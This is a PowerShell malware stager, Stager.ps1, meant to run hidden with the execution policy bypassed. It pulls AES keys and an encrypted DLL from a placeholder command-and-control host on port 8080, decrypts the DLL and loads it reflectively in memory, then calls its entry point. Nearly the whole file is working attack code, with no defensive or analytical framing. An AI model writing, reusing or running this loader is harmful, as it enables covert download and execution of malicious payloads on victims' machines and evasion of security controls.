# Stager.ps1 - Reflective loader for Stage1.dll
# Usage: powershell -nop -w hidden -exec bypass -File Stager.ps1

$ErrorActionPreference = 'Stop'

# 1. Retrieve AES keys from C2
$keyResp = Invoke-RestMethod -Uri 'http://<C2_HOST>:8080/key'
$key = [Convert]::FromBase64String($keyResp.key)
$iv  = [Convert]::FromBase64String($keyResp.iv)

# 2. Fetch encrypted Stage1.dll
$enc = Invoke-RestMethod -Uri 'http://<C2_HOST>:8080/stage1'
$raw = [Convert]::FromBase64String($enc)
$ivSlice = $raw[0..15]
$ct = $raw[16..]

# 3. Decrypt & reflective load
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $ivSlice
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$dec = $aes.CreateDecryptor()
$plain = $dec.TransformFinalBlock($ct,0,$ct.Length)

$assembly = [System.Reflection.Assembly]::Load($plain)
# Stage1.Main entrypoint expects no args; it self‑configures via /key polling
[Stage1.Implement]::Run()